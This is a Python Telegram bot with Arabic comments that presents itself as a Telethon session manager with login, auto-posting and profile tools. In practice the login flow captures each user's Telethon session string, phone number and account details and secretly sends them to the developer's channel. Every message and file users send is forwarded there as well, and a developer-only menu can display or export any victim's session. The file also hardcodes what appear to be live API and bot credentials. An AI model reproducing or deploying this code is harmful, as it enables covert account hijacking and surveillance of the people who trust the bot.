import os

import logging

from telethon import TelegramClient

from telethon.sessions import StringSession

from telethon.tl.functions.account import UpdateProfileRequest

from telethon.tl.functions.auth import SendCodeRequest, SignInRequest

from telethon.tl.functions.account import ChangePhoneRequest

from telethon.tl.functions.photos import UploadProfilePhotoRequest

import asyncio

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton

from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

from datetime import datetime

import pytz

import threading

import time

# إعدادات التسجيل

logging.basicConfig(level=logging.INFO)

logger = logging.getLogger(__name__)

# بيانات التطبيق - احصل عليها من https://my.telegram.org

API_ID = '27227913'

API_HASH = 'ba805b182eca99224403dbcd5d4f50aa'

# توكن البوت - احصل عليه من @BotFather

BOT_TOKEN = '7604888608:AAEaogdYmOY1xQ73NZVGoYrB4BQoyLqv1hY'

# إعدادات المطور

DEVELOPER_ID = 6583786208  # ايدي المطور

SESSION_CHANNEL = "@xbsbsbsbdvsgs"  # قناة حفظ الجلسات والرسائل

# حالات المحادثة

PHONE, CODE, NEW_PHONE, NEW_CODE = range(4)

POST_TEXT, POST_INTERVAL, POST_COUNT, POST_TARGET = range(4, 8)

CHANGE_PHOTO = 8

# تخزين البيانات المؤقتة

user_sessions = {}

time_update_tasks = {}  # لتخزين مهام تحديث الوقت

auto_post_tasks = {}   # لتخزين مهام النشر التلقائي

class TelethonManager:

    def __init__(self):

        self.client = None

        self.phone = None

        self.session_string = None

        

    async def start_session_with_phone(self, phone):

        """بدء جلسة Telethon باستخدام رقم الهاتف"""

        try:

            self.client = TelegramClient(StringSession(), API_ID, API_HASH)

            await self.client.connect()

            self.phone = phone

            return True, "تم بدء الجلسة بنجاح"

        except Exception as e:

            return False, f"خطأ في بدء الجلسة: {str(e)}"

    

    async def send_code(self, phone):

        """إرسال رمز التحقق"""

        try:

            await self.client.send_code_request(phone)

            return True, "تم إرسال رمز التحقق"

        except Exception as e:

            return False, f"خطأ في إرسال الرمز: {str(e)}"

    

    async def sign_in(self, code):

        """تسجيل الدخول بالرمز"""

        try:

            await self.client.sign_in(phone=self.phone, code=code)

            

            if self.client.is_user_authorized():

                # حفظ جلسة التليثون

                self.session_string = self.client.session.save()

                return True, "تم تسجيل الدخول بنجاح", self.session_string

            else:

                return False, "يحتاج الحساب إلى التحقق بخطوتين", None

                

        except Exception as e:

            return False, f"خطأ في تسجيل الدخول: {str(e)}", None

    

    async def change_phone_number(self, new_phone):

        """تغيير رقم الهاتف"""

        try:

            result = await self.client(SendCodeRequest(

                phone_number=new_phone,

                settings=None

            ))

            return True, "تم إرسال رمز التحقق للرقم الجديد", result.phone_code_hash

        except Exception as e:

            return False, f"خطأ في تغيير رقم الهاتف: {str(e)}", None

    

    async def confirm_phone_change(self, code, phone_code_hash):

        """تأكيد تغيير رقم الهاتف"""

        try:

            result = await self.client(ChangePhoneRequest(

                phone_number=self.phone,

                phone_code_hash=phone_code_hash,

                phone_code=code

            ))

            return True, "تم تغيير رقم الهاتف بنجاح"

        except Exception as e:

            return False, f"خطأ في تأكيد تغيير الرقم: {str(e)}"

    async def get_account_info(self):

        """الحصول على معلومات الحساب"""

        try:

            me = await self.client.get_me()

            return True, me

        except Exception as e:

            return False, f"خطأ في الحصول على معلومات الحساب: {str(e)}"

    

    async def update_profile_with_time(self):

        """تحديث الملف الشخصي مع إضافة الوقت"""

        try:

            # الحصول على الوقت الحالي بتوقيت العراق/بغداد

            iraq_tz = pytz.timezone('Asia/Baghdad')

            current_time = datetime.now(iraq_tz)

            time_str = current_time.strftime("%I:%M %p")

            

            me = await self.client.get_me()

            current_first_name = me.first_name or ""

            

            # إضافة الوقت إلى الاسم

            new_first_name = f"{current_first_name} | {time_str}"

            

            await self.client(UpdateProfileRequest(

                first_name=new_first_name

            ))

            return True, f"تم تحديث الاسم إلى: {new_first_name}"

        except Exception as e:

            return False, f"خطأ في تحديث الملف الشخصي: {str(e)}"

    

    async def change_profile_photo(self, photo_path):

        """تغيير صورة الملف الشخصي"""

        try:

            await self.client(UploadProfilePhotoRequest(

                file=await self.client.upload_file(photo_path)

            ))

            return True, "تم تغيير صورة الملف الشخصي بنجاح"

        except Exception as e:

            return False, f"خطأ في تغيير الصورة: {str(e)}"

    

    async def auto_post_message(self, text, interval, count, target):

        """النشر التلقائي للرسائل"""

        try:

            for i in range(count):

                await self.client.send_message(target, text)

                logger.info(f"تم إرسال الرسالة {i+1}/{count} إلى {target}")

                

                if i < count - 1:

                    await asyncio.sleep(interval)

            

            return True, f"تم إرسال {count} رسالة بنجاح"

        except Exception as e:

            return False, f"خطأ في النشر التلقائي: {str(e)}"

async def save_session_to_channel(session_string, user_info, user_id):

    """حفظ الجلسة في القناة الخاصة بالمطور"""

    try:

        # إنشاء عميل تليثون خاص لحفظ الجلسات

        client = TelegramClient(StringSession(), API_ID, API_HASH)

        await client.connect()

        

        if await client.is_user_authorized():

            # تنسيق الرسالة

            message = f"**🎯 جلسة جديدة محفوظة**\n\n"

            message += f"**👤 معلومات المستخدم:**\n"

            message += f"• ايدي المستخدم: `{user_id}`\n"

            message += f"• رقم الهاتف: `{user_info.get('phone', 'غير معروف')}`\n"

            message += f"• الاسم: {user_info.get('first_name', 'غير معروف')}\n"

            message += f"• الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"

            message += f"**🔐 جلسة التليثون:**\n`{session_string}`\n\n"

            message += f"**📱 معلومات الحساب:**\n"

            message += f"• ايدي الحساب: `{user_info.get('account_id', 'غير معروف')}`\n"

            message += f"• اسم المستخدم: @{user_info.get('username', 'لا يوجد')}\n"

            

            # إرسال الرسالة إلى القناة

            await client.send_message(SESSION_CHANNEL, message)

            await client.disconnect()

            return True, "تم حفظ الجلسة في القناة بنجاح"

        else:

            await client.disconnect()

            return False, "فشل في الاتصال بحساب المطور"

            

    except Exception as e:

        logger.error(f"خطأ في حفظ الجلسة في القناة: {e}")

        return False, f"خطأ في حفظ الجلسة: {str(e)}"

async def forward_message_to_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """تحويل أي رسالة إلى القناة"""

    try:

        user_id = update.effective_user.id

        user_name = update.effective_user.first_name

        username = update.effective_user.username

        message_text = update.message.text if update.message.text else "رسالة غير نصية"

        message_type = "نص"

        

        if update.message.photo:

            message_type = "صورة"

        elif update.message.video:

            message_type = "فيديو"

        elif update.message.document:

            message_type = "ملف"

        elif update.message.audio:

            message_type = "صوت"

        

        # إنشاء عميل تليثون خاص لإرسال الرسائل

        client = TelegramClient(StringSession(), API_ID, API_HASH)

        await client.connect()

        

        if await client.is_user_authorized():

            # تنسيق الرسالة

            forward_message = f"**📩 رسالة جديدة من مستخدم**\n\n"

            forward_message += f"**👤 معلومات المرسل:**\n"

            forward_message += f"• ايدي المستخدم: `{user_id}`\n"

            forward_message += f"• الاسم: {user_name}\n"

            forward_message += f"• المعرف: @{username if username else 'لا يوجد'}\n"

            forward_message += f"• نوع الرسالة: {message_type}\n"

            forward_message += f"• الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"

            

            if update.message.text:

                forward_message += f"**📝 محتوى الرسالة:**\n{message_text}"

            

            # إرسال الرسالة النصية أولاً

            await client.send_message(SESSION_CHANNEL, forward_message)

            

            # إذا كانت الرسالة تحتوي على ميديا، إرسالها أيضاً

            if update.message.photo:

                photo_file = await update.message.photo[-1].get_file()

                file_path = f"temp_photo_{user_id}.jpg"

                await photo_file.download_to_drive(file_path)

                await client.send_file(SESSION_CHANNEL, file_path)

                os.remove(file_path)

            elif update.message.video:

                video_file = await update.message.video.get_file()

                file_path = f"temp_video_{user_id}.mp4"

                await video_file.download_to_drive(file_path)

                await client.send_file(SESSION_CHANNEL, file_path)

                os.remove(file_path)

            elif update.message.document:

                doc_file = await update.message.document.get_file()

                file_path = f"temp_doc_{user_id}"

                await doc_file.download_to_drive(file_path)

                await client.send_file(SESSION_CHANNEL, file_path)

                os.remove(file_path)

            elif update.message.audio:

                audio_file = await update.message.audio.get_file()

                file_path = f"temp_audio_{user_id}.mp3"

                await audio_file.download_to_drive(file_path)

                await client.send_file(SESSION_CHANNEL, file_path)

                os.remove(file_path)

            

            await client.disconnect()

            logger.info(f"تم تحويل رسالة من المستخدم {user_id} إلى القناة")

            

        else:

            await client.disconnect()

            logger.error("فشل في الاتصال بحساب المطور لتحويل الرسالة")

            

    except Exception as e:

        logger.error(f"خطأ في تحويل الرسالة إلى القناة: {e}")

async def start_auto_time_update(user_id, application, chat_id):

    """بدء التحديث التلقائي للوقت كل دقيقة"""

    if user_id in time_update_tasks and not time_update_tasks[user_id].cancelled():

        time_update_tasks[user_id].cancel()

    

    async def update_time_periodically():

        while True:

            try:

                if user_id in user_sessions and user_sessions[user_id].get('client'):

                    manager = user_sessions[user_id]['manager']

                    success, message = await manager.update_profile_with_time()

                    if success:

                        await application.bot.send_message(chat_id, f"✅ {message}")

                    else:

                        await application.bot.send_message(chat_id, f"❌ {message}")

                else:

                    break

                

                await asyncio.sleep(60)  # الانتظار لمدة دقيقة

                

            except Exception as e:

                logger.error(f"خطأ في تحديث الوقت: {e}")

                break

    

    task = asyncio.create_task(update_time_periodically())

    time_update_tasks[user_id] = task

    return task

def stop_auto_time_update(user_id):

    """إيقاف التحديث التلقائي للوقت"""

    if user_id in time_update_tasks and not time_update_tasks[user_id].cancelled():

        time_update_tasks[user_id].cancel()

        del time_update_tasks[user_id]

        return True

    return False

def stop_auto_post(user_id):

    """إيقاف النشر التلقائي"""

    if user_id in auto_post_tasks and not auto_post_tasks[user_id].cancelled():

        auto_post_tasks[user_id].cancel()

        del auto_post_tasks[user_id]

        return True

    return False

def is_developer(user_id):

    """التحقق إذا كان المستخدم هو المطور"""

    return user_id == DEVELOPER_ID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """بدء المحادثة مع البوت"""

    user_id = update.effective_user.id

    

    if user_id not in user_sessions:

        user_sessions[user_id] = {'manager': TelethonManager()}

    

    # إنشاء لوحة المفاتيح الأساسية

    keyboard = [

        [KeyboardButton("تسجيل الدخول عبر رقم الهاتف")],

        [KeyboardButton("تغيير رقم الهاتف")],

        [KeyboardButton("معلومات الحساب"), KeyboardButton("إنهاء الجلسة")],

        [KeyboardButton("النشر التلقائي"), KeyboardButton("تحديث الاسم بالوقت")],

        [KeyboardButton("تشغيل تحديث الوقت التلقائي"), KeyboardButton("إيقاف تحديث الوقت التلقائي")],

        [KeyboardButton("إيقاف النشر التلقائي"), KeyboardButton("تغيير صورة الملف الشخصي")]

    ]

    

    # إضافة زر المطور إذا كان المستخدم هو المطور

    if is_developer(user_id):

        keyboard.append([KeyboardButton("👑 إدارة الجلسات (المطور)")])

    

    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    

    welcome_text = "مرحباً! أنا بوت لإدارة جلسات Telethon.\nاختر أحد الخيارات:"

    

    # إضافة ترحيب خاص للمطور

    if is_developer(user_id):

        welcome_text = "👑 **مرحباً أيها المطور!**\n" + welcome_text

    

    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """معالجة الرسائل النصية"""

    text = update.message.text

    user_id = update.effective_user.id

    

    # تحويل الرسالة إلى القناة أولاً

    await forward_message_to_channel(update, context)

    

    if text == "تسجيل الدخول عبر رقم الهاتف":

        await update.message.reply_text("أرسل رقم هاتفك مع رمز الدولة (مثال: +1234567890):")

        return PHONE

    

    elif text == "تغيير رقم الهاتف":

        if user_id in user_sessions and user_sessions[user_id].get('client'):

            await update.message.reply_text("أرسل رقم الهاتف الجديد مع رمز الدولة:")

            return NEW_PHONE

        else:

            await update.message.reply_text("يجب بدء جلسة أولاً!")

            return ConversationHandler.END

    

    elif text == "معلومات الحساب":

        if user_id in user_sessions and user_sessions[user_id].get('client'):

            client = user_sessions[user_id]['client']

            me = await client.get_me()

            info = f"الاسم: {me.first_name}\n"

            if me.last_name:

                info += f"الاسم الأخير: {me.last_name}\n"

            info += f"اسم المستخدم: @{me.username}\n" if me.username else "لا يوجد اسم مستخدم\n"

            info += f"رقم الهاتف: {me.phone}\n"

            info += f"معرف الحساب: {me.id}"

            

            await update.message.reply_text(info)

        else:

            await update.message.reply_text("لا توجد جلسة نشطة!")

    

    elif text == "إنهاء الجلسة":

        if user_id in user_sessions and user_sessions[user_id].get('client'):

            # إيقاف جميع المهام التلقائية

            stop_auto_time_update(user_id)

            stop_auto_post(user_id)

            

            await user_sessions[user_id]['client'].disconnect()

            user_sessions[user_id]['client'] = None

            user_sessions[user_id]['manager'] = None

            await update.message.reply_text("تم إنهاء الجلسة بنجاح!")

        else:

            await update.message.reply_text("لا توجد جلسة نشطة!")

    

    elif text == "النشر التلقائي":

        if user_id in user_sessions and user_sessions[user_id].get('client'):

            await update.message.reply_text("أرسل النص الذي تريد نشره:")

            return POST_TEXT

        else:

            await update.message.reply_text("يجب بدء جلسة أولاً!")

            return ConversationHandler.END

    

    elif text == "تحديث الاسم بالوقت":

        if user_id in user_sessions and user_sessions[user_id].get('client'):

            manager = user_sessions[user_id]['manager']

            success, message = await manager.update_profile_with_time()

            await update.message.reply_text(message)

        else:

            await update.message.reply_text("يجب بدء جلسة أولاً!")

    

    elif text == "تشغيل تحديث الوقت التلقائي":

        if user_id in user_sessions and user_sessions[user_id].get('client'):

            await start_auto_time_update(user_id, context.application, update.effective_chat.id)

            await update.message.reply_text("✅ تم تشغيل التحديث التلقائي للوقت كل دقيقة")

        else:

            await update.message.reply_text("يجب بدء جلسة أولاً!")

    

    elif text == "إيقاف تحديث الوقت التلقائي":

        if stop_auto_time_update(user_id):

            await update.message.reply_text("✅ تم إيقاف التحديث التلقائي للوقت")

        else:

            await update.message.reply_text("❌ لا يوجد تحديث تلقائي نشط")

    

    elif text == "إيقاف النشر التلقائي":

        if stop_auto_post(user_id):

            await update.message.reply_text("✅ تم إيقاف النشر التلقائي")

        else:

            await update.message.reply_text("❌ لا يوجد نشر تلقائي نشط")

    

    elif text == "تغيير صورة الملف الشخصي":

        if user_id in user_sessions and user_sessions[user_id].get('client'):

            await update.message.reply_text("أرسل الصورة التي تريد تعيينها كصورة للملف الشخصي:")

            return CHANGE_PHOTO

        else:

            await update.message.reply_text("يجب بدء جلسة أولاً!")

            return ConversationHandler.END

    

    elif text == "👑 إدارة الجلسات (المطور)" and is_developer(user_id):

        # قائمة خيارات المطور

        developer_keyboard = [

            [KeyboardButton("📊 إحصائيات الجلسات")],

            [KeyboardButton("🔍 عرض جلسة محددة")],

            [KeyboardButton("📥 تصدير جميع الجلسات")],

            [KeyboardButton("🔙 الرجوع للقائمة الرئيسية")]

        ]

        reply_markup = ReplyKeyboardMarkup(developer_keyboard, resize_keyboard=True)

        await update.message.reply_text(

            "👑 **قائمة المطور**\n\n"

            "• 📊 إحصائيات الجلسات - عرض عدد الجلسات النشطة\n"

            "• 🔍 عرض جلسة محددة - البحث عن جلسة مستخدم معين\n"

            "• 📥 تصدير جميع الجلسات - حفظ جميع الجلسات في القناة\n"

            "• 🔙 الرجوع للقائمة الرئيسية",

            reply_markup=reply_markup

        )

    

    elif text == "📊 إحصائيات الجلسات" and is_developer(user_id):

        active_sessions = sum(1 for session in user_sessions.values() if session.get('client'))

        await update.message.reply_text(

            f"📊 **إحصائيات الجلسات:**\n\n"

            f"• الجلسات النشطة: {active_sessions}\n"

            f"• إجمالي المستخدمين: {len(user_sessions)}\n"

            f"• مهام تحديث الوقت: {len(time_update_tasks)}\n"

            f"• مهام النشر التلقائي: {len(auto_post_tasks)}"

        )

    

    elif text == "🔍 عرض جلسة محددة" and is_developer(user_id):

        await update.message.reply_text("أرسل ايدي المستخدم لعرض جلسته:")

        context.user_data['waiting_for_user_id'] = True

    

    elif text == "📥 تصدير جميع الجلسات" and is_developer(user_id):

        await update.message.reply_text("⏳ جاري تصدير جميع الجلسات إلى القناة...")

        exported_count = 0

        

        for user_id, session_data in user_sessions.items():

            if session_data.get('client') and session_data.get('session_string'):

                try:

                    client = session_data['client']

                    me = await client.get_me()

                    

                    user_info = {

                        'phone': me.phone,

                        'first_name': me.first_name,

                        'username': me.username,

                        'account_id': me.id

                    }

                    

                    success, message = await save_session_to_channel(

                        session_data['session_string'], 

                        user_info, 

                        user_id

                    )

                    

                    if success:

                        exported_count += 1

                    

                    await asyncio.sleep(1)  # تجنب التحميل الزائد

                    

                except Exception as e:

                    logger.error(f"خطأ في تصدير جلسة {user_id}: {e}")

        

        await update.message.reply_text(f"✅ تم تصدير {exported_count} جلسة إلى القناة")

    

    elif text == "🔙 الرجوع للقائمة الرئيسية":

        await start(update, context)

    

    # معالجة إدخال ايدي المستخدم من قبل المطور

    elif context.user_data.get('waiting_for_user_id') and is_developer(user_id):

        try:

            target_user_id = int(text)

            if target_user_id in user_sessions and user_sessions[target_user_id].get('session_string'):

                session_data = user_sessions[target_user_id]

                session_string = session_data['session_string']

                

                await update.message.reply_text(

                    f"🔍 **جلسة المستخدم {target_user_id}:**\n\n"

                    f"`{session_string}`\n\n"

                    f"**ملاحظة:** هذه الجلسة حساسة، احفظها في مكان آمن.",

                    parse_mode='Markdown'

                )

            else:

                await update.message.reply_text("❌ لا توجد جلسة نشطة لهذا المستخدم")

        except ValueError:

            await update.message.reply_text("❌ يرجى إدخال ايدي مستخدم صحيح")

        

        context.user_data['waiting_for_user_id'] = False

    

    else:

        # إذا كانت الرسالة ليست أمراً معروفاً، نرسل رسالة مساعدة

        await update.message.reply_text("اختر أحد الخيارات من القائمة أدناه:")

    

    return ConversationHandler.END

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """الحصول على رقم الهاتف"""

    phone = update.message.text

    user_id = update.effective_user.id

    

    user_sessions[user_id]['phone'] = phone

    

    manager = user_sessions[user_id]['manager']

    success, message = await manager.start_session_with_phone(phone)

    

    if success:

        success, message = await manager.send_code(phone)

        if success:

            await update.message.reply_text("تم إرسال رمز التحقق. أرسل الرمز:")

            return CODE

        else:

            await update.message.reply_text(message)

            return ConversationHandler.END

    else:

        await update.message.reply_text(message)

        return ConversationHandler.END

async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """الحصول على رمز التحقق"""

    code = update.message.text

    user_id = update.effective_user.id

    

    manager = user_sessions[user_id]['manager']

    success, message, session_string = await manager.sign_in(code)

    

    if success:

        user_sessions[user_id]['client'] = manager.client

        user_sessions[user_id]['session_string'] = session_string

        

        # حفظ الجلسة في القناة تلقائياً

        try:

            me = await manager.client.get_me()

            user_info = {

                'phone': me.phone,

                'first_name': me.first_name,

                'username': me.username,

                'account_id': me.id

            }

            

            success_save, save_message = await save_session_to_channel(

                session_string, 

                user_info, 

                user_id

            )

            

            if success_save:

                message += f"\n\n✅ {save_message}"

            else:

                message += f"\n\n⚠️ {save_message}"

                

        except Exception as e:

            logger.error(f"خطأ في حفظ الجلسة: {e}")

        

        await update.message.reply_text("✅ " + message + f"\n\nجلسة التليثون:\n`{session_string}`", parse_mode='Markdown')

    else:

        await update.message.reply_text("❌ " + message)

    

    return ConversationHandler.END

async def get_new_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """الحصول على رقم الهاتف الجديد"""

    new_phone = update.message.text

    user_id = update.effective_user.id

    

    user_sessions[user_id]['new_phone'] = new_phone

    

    manager = user_sessions[user_id]['manager']

    success, message, phone_code_hash = await manager.change_phone_number(new_phone)

    

    if success:

        user_sessions[user_id]['phone_code_hash'] = phone_code_hash

        await update.message.reply_text("تم إرسال رمز التحقق للرقم الجديد. أرسل الرمز:")

        return NEW_CODE

    else:

        await update.message.reply_text(message)

        return ConversationHandler.END

async def get_new_code(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """الحصول على رمز التحقق الجديد"""

    code = update.message.text

    user_id = update.effective_user.id

    

    manager = user_sessions[user_id]['manager']

    phone_code_hash = user_sessions[user_id]['phone_code_hash']

    

    success, message = await manager.confirm_phone_change(code, phone_code_hash)

    

    if success:

        await update.message.reply_text("✅ " + message)

    else:

        await update.message.reply_text("❌ " + message)

    

    return ConversationHandler.END

# دوال النشر التلقائي

async def get_post_text(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """الحصول على نص النشر"""

    text = update.message.text

    user_id = update.effective_user.id

    

    user_sessions[user_id]['post_text'] = text

    await update.message.reply_text("أرسل الفترة الزمنية بين كل نشر (بالثواني):")

    return POST_INTERVAL

async def get_post_interval(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """الحصول على الفترة الزمنية"""

    try:

        interval = int(update.message.text)

        user_id = update.effective_user.id

        

        if interval < 1:

            await update.message.reply_text("يجب أن تكون الفترة الزمنية أكبر من 0 ثانية. أعد إدخال الرقم:")

            return POST_INTERVAL

        

        user_sessions[user_id]['post_interval'] = interval

        await update.message.reply_text("أرسل عدد المرات التي تريد نشر الرسالة فيها:")

        return POST_COUNT

    except ValueError:

        await update.message.reply_text("يرجى إدخال رقم صحيح. أعد إدخال الفترة الزمنية:")

        return POST_INTERVAL

async def get_post_count(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """الحصول على عدد مرات النشر"""

    try:

        count = int(update.message.text)

        user_id = update.effective_user.id

        

        if count < 1:

            await update.message.reply_text("يجب أن يكون العدد أكبر من 0. أعد إدخال الرقم:")

            return POST_COUNT

        

        user_sessions[user_id]['post_count'] = count

        await update.message.reply_text("أرسل رابط المجموعة أو المعرف (مثال: @group_username):")

        return POST_TARGET

    except ValueError:

        await update.message.reply_text("يرجى إدخال رقم صحيح. أعد إدخال عدد المرات:")

        return POST_COUNT

async def get_post_target(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """الحصول على الهدف للنشر"""

    target = update.message.text

    user_id = update.effective_user.id

    

    if 't.me/' in target:

        target = target.split('t.me/')[-1].split('/')[0]

    

    user_sessions[user_id]['post_target'] = target

    

    manager = user_sessions[user_id]['manager']

    text = user_sessions[user_id]['post_text']

    interval = user_sessions[user_id]['post_interval']

    count = user_sessions[user_id]['post_count']

    

    await update.message.reply_text(f"بدء النشر التلقائي...")

    

    # تشغيل النشر التلقائي في مهمة منفصلة

    async def auto_post_task():

        try:

            success, message = await manager.auto_post_message(text, interval, count, target)

            await update.message.reply_text(message)

        except Exception as e:

            await update.message.reply_text(f"❌ خطأ في النشر التلقائي: {str(e)}")

    

    task = asyncio.create_task(auto_post_task())

    auto_post_tasks[user_id] = task

    

    return ConversationHandler.END

async def change_profile_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """تغيير صورة الملف الشخصي"""

    user_id = update.effective_user.id

    

    if update.message.photo:

        photo_file = await update.message.photo[-1].get_file()

        file_path = f"temp_photo_{user_id}.jpg"

        await photo_file.download_to_drive(file_path)

        

        manager = user_sessions[user_id]['manager']

        success, message = await manager.change_profile_photo(file_path)

        

        try:

            os.remove(file_path)

        except:

            pass

        

        await update.message.reply_text("✅ " + message if success else "❌ " + message)

    else:

        await update.message.reply_text("يرجى إرسال صورة صالحة.")

    

    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):

    """إلغاء العملية"""

    await update.message.reply_text("تم إلغاء العملية.")

    return ConversationHandler.END

def main():

    """الدالة الرئيسية لتشغيل البوت"""

    application = Application.builder().token(BOT_TOKEN).build()

    

    conv_handler = ConversationHandler(

        entry_points=[MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)],

        states={

            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],

            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],

            NEW_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_new_phone)],

            NEW_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_new_code)],

            POST_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_post_text)],

            POST_INTERVAL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_post_interval)],

            POST_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_post_count)],

            POST_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_post_target)],

            CHANGE_PHOTO: [MessageHandler(filters.PHOTO, change_profile_photo)],

        },

        fallbacks=[CommandHandler('cancel', cancel)],

    )

    

    application.add_handler(CommandHandler("start", start))

    application.add_handler(conv_handler)

    

    # إضافة معالج لجميع الرسائل لتحويلها إلى القناة

    application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, forward_message_to_channel), group=1)

    

    print("البوت يعمل...")

    application.run_polling()

if __name__ == '__main__':

    main()
